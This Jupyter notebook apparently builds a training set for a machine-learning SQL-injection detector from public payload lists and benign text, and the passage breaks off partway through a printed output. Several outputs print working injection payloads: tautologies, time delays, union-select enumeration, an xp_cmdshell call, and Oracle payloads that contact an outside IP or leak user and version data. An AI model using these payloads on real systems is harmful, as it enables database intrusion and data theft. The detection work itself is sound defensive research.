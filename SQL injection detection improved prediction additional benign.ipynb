{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### This notebook is intended to predict sql injection attacks"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[nltk_data] Downloading package punkt to /home/ebryx/nltk_data...\n",
      "[nltk_data]   Package punkt is already up-to-date!\n",
      "[nltk_data] Downloading package stopwords to /home/ebryx/nltk_data...\n",
      "[nltk_data]   Package stopwords is already up-to-date!\n",
      "[nltk_data] Downloading package wordnet to /home/ebryx/nltk_data...\n",
      "[nltk_data]   Package wordnet is already up-to-date!\n"
     ]
    }
   ],
   "source": [
    "\n",
    "# import required packages\n",
    "\n",
    "import glob\n",
    "import time\n",
    "import pandas as pd\n",
    "# from xml.dom import minidom\n",
    "from nltk import ngrams\n",
    "from nltk.tokenize import sent_tokenize\n",
    "import nltk\n",
    "nltk.download('punkt')\n",
    "nltk.download('stopwords')\n",
    "nltk.download('wordnet')\n",
    "from nltk.stem import PorterStemmer\n",
    "from nltk.stem import PorterStemmer\n",
    "from nltk.tokenize import sent_tokenize, word_tokenize\n",
    "from nltk.stem import WordNetLemmatizer\n",
    "from nltk.corpus import stopwords \n",
    "from nltk.tokenize import word_tokenize"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {},
   "outputs": [],
   "source": [
    "import keras"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "metadata": {},
   "outputs": [],
   "source": [
    "import nltk\n",
    "import pandas as pd\n",
    "import os"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_name: git_foospidy_payloads_fuzzing_code_db_sqli.txt\n",
    "##### Comments :  \n",
    "1. removed \\n at the end of each line\n",
    "2.  replaced %20 by space\n",
    "#### Source: https://github.com/foospidy/payloads/tree/master/other/sqli"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "metadata": {},
   "outputs": [],
   "source": [
    "# preprocess sql data to have same format for all files\n",
    "\n",
    "def clean_sqli_data(data):\n",
    "    \n",
    "    for i in range(len(data)):\n",
    "        \n",
    "        data[i]=data[i].replace('\\n', '')\n",
    "        data[i]=data[i].replace('%20', ' ')\n",
    "        data[i]=data[i].replace('=', ' = ')\n",
    "        data[i]=data[i].replace('((', ' (( ')\n",
    "        data[i]=data[i].replace('))', ' )) ')\n",
    "        data[i]=data[i].replace('(', ' ( ')\n",
    "        data[i]=data[i].replace(')', ' ) ')\n",
    "    \n",
    "    return data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_foospidy_payloads_fuzzing_code_db_sqli.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {},
   "outputs": [],
   "source": [
    "# read data from file\n",
    "\n",
    "sql_lines_fuzzing=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_fuzzing.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_fuzzing=clean_sqli_data(sql_lines_fuzzing) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'sqlvuln\",\n",
       " \"'+sqlvuln\",\n",
       " 'sqlvuln;',\n",
       " ' ( sqlvuln ) ',\n",
       " \"a' or 1 = 1--\",\n",
       " '\"a\"\" or 1 = 1--\"',\n",
       " ' or a  =  a',\n",
       " \"a' or 'a'  =  'a\",\n",
       " '1 or 1 = 1',\n",
       " \"a' waitfor delay '0:0:10'--\",\n",
       " \"1 waitfor delay '0:0:10'--\",\n",
       " 'declare @q nvarchar  ( 4000 )  select @q  = ',\n",
       " '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A',\n",
       " '0',\n",
       " '031003000270000']"
      ]
     },
     "execution_count": 79,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_fuzzing[:15]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_foospidy_payloads_other_sqli_camoufl4g3.txt\n",
    "##### Comments : ok\n",
    "#### Source: https://github.com/foospidy/payloads/tree/master/other/sqli"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_foospidy_payloads_other_sqli_camoufl4g3.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {},
   "outputs": [],
   "source": [
    "# read data from file\n",
    "\n",
    "sql_lines_camoufl4g3=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_camoufl4g3.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'-'\\n\",\n",
       " \"' '\\n\",\n",
       " \"'&'\\n\",\n",
       " \"'^'\\n\",\n",
       " \"'*'\\n\",\n",
       " \"' or ''-'\\n\",\n",
       " \"' or '' '\\n\",\n",
       " \"' or ''&'\\n\",\n",
       " \"' or ''^'\\n\",\n",
       " \"' or ''*'\\n\",\n",
       " '\"-\"\\n',\n",
       " '\" \"\\n',\n",
       " '\"&\"\\n',\n",
       " '\"^\"\\n',\n",
       " '\"*\"\\n']"
      ]
     },
     "execution_count": 82,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_camoufl4g3[:15] # data before cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_camoufl4g3=clean_sqli_data(sql_lines_camoufl4g3)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'-'\",\n",
       " \"' '\",\n",
       " \"'&'\",\n",
       " \"'^'\",\n",
       " \"'*'\",\n",
       " \"' or ''-'\",\n",
       " \"' or '' '\",\n",
       " \"' or ''&'\",\n",
       " \"' or ''^'\",\n",
       " \"' or ''*'\",\n",
       " '\"-\"',\n",
       " '\" \"',\n",
       " '\"&\"',\n",
       " '\"^\"',\n",
       " '\"*\"']"
      ]
     },
     "execution_count": 84,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_camoufl4g3[:15]  # data after cleaning"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_foospidy_payloads_other_sqli_libinjection-bypasses.txt\n",
    "##### Comments: Should Remove &()o1: from start of each sentence\n",
    "#### Source: https://github.com/foospidy/payloads/tree/master/other/sqli"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_foospidy_payloads_other_sqli_libinjection-bypasses.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "metadata": {},
   "outputs": [],
   "source": [
    "# read data from file\n",
    "\n",
    "sql_lines_bypasses=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_bypasses.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['&()o1: select * from users where id=1 or (\\\\)=1 union select 1,@@VERSION -- 1\\n',\n",
       " '&(.)o: select * from users where id=1 or (\\\\.)=1 union select 1,@@VERSION -- 1\\n',\n",
       " '&(1&1: select * from users where id=1 or (\\\\+)=1 or 1=1 -- 1\\n',\n",
       " '&(1)o: select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " '&(1UE: select * from users where id=1 or (\\\\+)=1 union select 1,@@VERSION -- 1\\n']"
      ]
     },
     "execution_count": 87,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_bypasses[:5] # before cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 88,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_bypasses=clean_sqli_data(sql_lines_bypasses)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['& (  ) o1: select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
       " '& ( . ) o: select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
       " '& ( 1&1: select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
       " '& ( 1 ) o: select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " '& ( 1UE: select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1']"
      ]
     },
     "execution_count": 89,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_bypasses[:5]  # data after cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "metadata": {},
   "outputs": [],
   "source": [
    "# if don't want &(*)* sign in beginning of each sentence then run next code else don't\n",
    "\n",
    "for i in range(len(sql_lines_bypasses)):\n",
    "    sentence=sql_lines_bypasses[i]\n",
    "    sql_lines_bypasses[i]=sentence.split(':')[1]\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[' select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1']"
      ]
     },
     "execution_count": 91,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_bypasses[:5]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_foospidy_payloads_owasp_sqli.txt\n",
    "##### Comments: ok\n",
    "#### Source: https://github.com/foospidy/payloads/tree/master/other/sqli"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 92,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_foospidy_payloads_owasp_sqli.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 93,
   "metadata": {},
   "outputs": [],
   "source": [
    "# read data from file\n",
    "\n",
    "sql_lines_owasp=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_owasp.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 94,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['a\\n',\n",
       " \"a' \\n\",\n",
       " \"a' --\\n\",\n",
       " \"a' or 1=1; --\\n\",\n",
       " '@\\n',\n",
       " '?\\n',\n",
       " \"' and 1=0) union all\\n\",\n",
       " '? or 1=1 --\\n',\n",
       " \"x' and userid is NULL; --\\n\",\n",
       " \"x' and email is NULL; --\\n\",\n",
       " \"anything' or 'x'='x\\n\",\n",
       " \"x' and 1=(select count(*) from tabname); --\\n\",\n",
       " \"x' and members.email is NULL; --\\n\",\n",
       " \"x' or full_name like '%bob%\\n\",\n",
       " '23 or 1=1; --\\n']"
      ]
     },
     "execution_count": 94,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_owasp[0:15] # before cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 95,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_owasp=clean_sqli_data(sql_lines_owasp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['a',\n",
       " \"a' \",\n",
       " \"a' --\",\n",
       " \"a' or 1 = 1; --\",\n",
       " '@',\n",
       " '?',\n",
       " \"' and 1 = 0 )  union all\",\n",
       " '? or 1 = 1 --',\n",
       " \"x' and userid is NULL; --\",\n",
       " \"x' and email is NULL; --\",\n",
       " \"anything' or 'x' = 'x\",\n",
       " \"x' and 1 =  ( select count ( * )  from tabname ) ; --\",\n",
       " \"x' and members.email is NULL; --\",\n",
       " \"x' or full_name like '%bob%\",\n",
       " '23 or 1 = 1; --']"
      ]
     },
     "execution_count": 96,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_owasp[:15] # after cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_seclist_fuzzing_sqli_Generic-SQLi.txt\n",
    "##### comments: should we remove %20 by spaces because %20 equals to space\n",
    "#### Source: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_seclist_fuzzing_sqli_Generic-SQLi.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {},
   "outputs": [],
   "source": [
    "# read data from file\n",
    "\n",
    "sql_lines_Generic=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_Generic.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 99,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\")%20or%20('x'='x\\n\",\n",
       " '%20or%201=1\\n',\n",
       " \"; execute immediate 'sel' || 'ect us' || 'er'\\n\",\n",
       " 'benchmark(10000000,MD5(1))#\\n',\n",
       " 'update\\n',\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--\\n',\n",
       " '1) or pg_sleep(__TIME__)--\\n',\n",
       " '||(elt(-3+5,bin(15),ord(10),hex(char(45))))\\n',\n",
       " '\"hi\"\") or (\"\"a\"\"=\"\"a\"\\n',\n",
       " 'delete\\n',\n",
       " 'like\\n',\n",
       " '\" or sleep(__TIME__)#\\n',\n",
       " 'pg_sleep(__TIME__)--\\n',\n",
       " '*(|(objectclass=*))\\n',\n",
       " 'declare @q nvarchar (200) 0x730065006c00650063 ...\\n']"
      ]
     },
     "execution_count": 99,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_Generic[:15] # before cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_Generic=clean_sqli_data(sql_lines_Generic)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 101,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\" )  or  ( 'x' = 'x\",\n",
       " ' or 1 = 1',\n",
       " \"; execute immediate 'sel' || 'ect us' || 'er'\",\n",
       " 'benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " 'update',\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--',\n",
       " '1 )  or pg_sleep ( __TIME__ ) --',\n",
       " '|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ',\n",
       " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
       " 'delete',\n",
       " 'like',\n",
       " '\" or sleep ( __TIME__ ) #',\n",
       " 'pg_sleep ( __TIME__ ) --',\n",
       " '* ( | ( objectclass = *  )  )  ',\n",
       " 'declare @q nvarchar  ( 200 )  0x730065006c00650063 ...']"
      ]
     },
     "execution_count": 101,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_Generic[:15] # after cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_name: scottparker_ml_sqli_src__trainingdata_plain.txt\n",
    "##### Comments: \n",
    "removed last 22 records containing URLs\n",
    "#### Source: https://github.com/tungpv98/Detect-Sql-Injection-by-Machine-Learning/tree/ebeb3287931677a3a42f11a7a08dbc13e374ff05/Sql-Injection/source/trainingdata"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 102,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "# function to remove stopwords\n",
    "\n",
    "stop_words = set(stopwords.words('english')) \n",
    "\n",
    "def fun_remove_stop_words(posts):\n",
    "\n",
    "    filtered=''\n",
    "    \n",
    "    for x in posts.split(' '):\n",
    "        if x not in stop_words:\n",
    "            filtered+=' '+x\n",
    "    \n",
    "    return filtered"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/'\n",
    "file=\"scottparker_ml_sqli_src__trainingdata_plain.txt\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "metadata": {},
   "outputs": [],
   "source": [
    "#read benign data\n",
    "\n",
    "df = pd.read_csv(os.path.join(path,file), sep='Aw3s0meSc0t7', names=['benign'], header=None, engine='python')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 105,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>benign</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Add plain text here</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Ne te quaesiveris extra.</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Man is his own star; and the soul that can</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Render an honest and a perfect man,</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Commands all light, all influence, all fate;</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                         benign\n",
       "0                           Add plain text here\n",
       "1                      Ne te quaesiveris extra.\n",
       "2    Man is his own star; and the soul that can\n",
       "3           Render an honest and a perfect man,\n",
       "4  Commands all light, all influence, all fate;"
      ]
     },
     "execution_count": 105,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 106,
   "metadata": {},
   "outputs": [],
   "source": [
    "plain_text=df['benign'].values  # get sentences"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 107,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['Add plain text here', 'Ne te quaesiveris extra.',\n",
       "       'Man is his own star; and the soul that can',\n",
       "       'Render an honest and a perfect man,',\n",
       "       'Commands all light, all influence, all fate;'], dtype=object)"
      ]
     },
     "execution_count": 107,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "plain_text[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 108,
   "metadata": {},
   "outputs": [],
   "source": [
    "plain_text=plain_text[:-22] # removed last 22 records that were urls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 109,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "3672"
      ]
     },
     "execution_count": 109,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(plain_text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "metadata": {},
   "outputs": [],
   "source": [
    "# convert from list to string\n",
    "\n",
    "data=''\n",
    "for x in plain_text:\n",
    "    data+=\" \" + x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "str"
      ]
     },
     "execution_count": 111,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "type(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 112,
   "metadata": {},
   "outputs": [],
   "source": [
    "data=fun_remove_stop_words(data)  # remove stop words\n",
    "data=data.split('.')              # split sentences"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 113,
   "metadata": {},
   "outputs": [],
   "source": [
    "# seperate words inside tags\n",
    "\n",
    "for i in range(len(data)):\n",
    "    data[i]=data[i].replace('<', ' <')\n",
    "    data[i]=data[i].replace('>', '> ')\n",
    "    data[i]=data[i].replace('=', ' = ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 114,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['  Add plain text Ne te quaesiveris extra',\n",
       " ' Man star; soul Render honest perfect man, Commands light, influence, fate; Nothing falls early late',\n",
       " ' Our acts angels are, good ill, Our fatal shadows walk us still',\n",
       " ' Epilogue Beaumont Fletcher’s Honest Man’s Fortune Cast bantling rocks, Suckle she-wolf’s teat; Wintered hawk fox, Power speed hands feet',\n",
       " ' I read day verses written eminent painter original conventional']"
      ]
     },
     "execution_count": 114,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data[:5]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Statistics"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 115,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Benign records: 3072\n"
     ]
    }
   ],
   "source": [
    "print(\"Benign records: %2i\" %len(data))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "metadata": {},
   "outputs": [],
   "source": [
    "# read self created benign data\n",
    "\n",
    "path='./data/collection/benign_for_training.txt'\n",
    "benign_data=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    benign_data.append(x)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 117,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "476"
      ]
     },
     "execution_count": 117,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(benign_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 118,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SQL fuzzing : 142  camoufl4gs : 77 parsed : 474 owasp : 167 generic : 268 \n",
      " total sql injection data : 1128 \n"
     ]
    }
   ],
   "source": [
    "print(f\"SQL fuzzing : {len(sql_lines_fuzzing)}  camoufl4gs : {len(sql_lines_camoufl4g3)} parsed : {len(sql_lines_bypasses)} owasp : {len(sql_lines_owasp)} generic : {len(sql_lines_Generic)} \\n total sql injection data : {len(sql_lines_Generic)+len(sql_lines_owasp)+len(sql_lines_bypasses)+len(sql_lines_camoufl4g3)+len(sql_lines_fuzzing)} \")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### combination of all sqli attacks"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_sqli_sentence=sql_lines_owasp+sql_lines_bypasses+sql_lines_camoufl4g3+sql_lines_fuzzing+sql_lines_Generic"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1128"
      ]
     },
     "execution_count": 120,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(all_sqli_sentence)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "metadata": {},
   "outputs": [],
   "source": [
    "# replace numeric values by a keyword 'numeric'\n",
    "def optional_numeric_to_numeric(all_sqli_sentence):\n",
    "    \n",
    "    for i in range(len(all_sqli_sentence)):\n",
    "        \n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1 ', 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 1', 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"'1 \", \"'numeric \")\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 1'\", \" numeric'\")\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1,', 'numeric,')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"1\\ \", 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"‘1\", '‘numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 2 \", \" numeric \")\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 3 ', ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 3--', ' numeric--')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 4 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 5 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 6 ', ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 7 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 8 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1234', ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"22\", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 8 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 200 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"23 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('\"1', '\"numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1\"', '\"numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"7659\", 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 37 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 45 \", ' numeric ')\n",
    "    \n",
    "    return all_sqli_sentence\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['a',\n",
       " \"a' \",\n",
       " \"a' --\",\n",
       " \"a' or 1 = 1; --\",\n",
       " '@',\n",
       " '?',\n",
       " \"' and 1 = 0 )  union all\",\n",
       " '? or 1 = 1 --',\n",
       " \"x' and userid is NULL; --\",\n",
       " \"x' and email is NULL; --\",\n",
       " \"anything' or 'x' = 'x\",\n",
       " \"x' and 1 =  ( select count ( * )  from tabname ) ; --\",\n",
       " \"x' and members.email is NULL; --\",\n",
       " \"x' or full_name like '%bob%\",\n",
       " '23 or 1 = 1; --',\n",
       " \"'; exec master..xp_cmdshell 'ping 172.10.1.255'--\",\n",
       " 'a',\n",
       " '1 or 1 = 1',\n",
       " \"1' or '1' = '1\",\n",
       " \"1 and user_name (  )   =  'dbo'\",\n",
       " '1',\n",
       " \"1'1\",\n",
       " '1 exec sp_  ( or exec xp_ ) ',\n",
       " '1 and 1 = 1',\n",
       " \"1' and 1 =  ( select count ( * )  from tablenames ) ; --\",\n",
       " '1',\n",
       " \"1 and user_name (  )   =  'dbo'\",\n",
       " \"\\\\'; desc users; --\",\n",
       " \"1\\\\'1\",\n",
       " \"1' and non_existant_table  =  '1\",\n",
       " \"' or username is not NULL or username  =  '\",\n",
       " \"1 and ascii ( lower ( substring  (  (  select top 1 name from sysobjects where xtype = 'u' ) , 1, 1  )  )   )  > 116\",\n",
       " \"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype  =  'u' --\",\n",
       " '1 uni/**/on select all from where',\n",
       " '’ or ‘1’ = ’1',\n",
       " \"' or '1' = '1\",\n",
       " \"'||utl_http.request ( 'httP://192.168.1.1/' ) ||'\",\n",
       " \"' || myappadmin.adduser ( 'admin', 'newpass' )  || '\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT banner FROM v$version WHERE ROWNUM = 1  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.DATABASE_NAME FROM DUAL  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT host_name FROM v$instance  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND 'i' = 'i\",\n",
       " \"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( USERNAME  )  )   FROM SYS.ALL_USERS  )  )   AND 'i' = 'i\",\n",
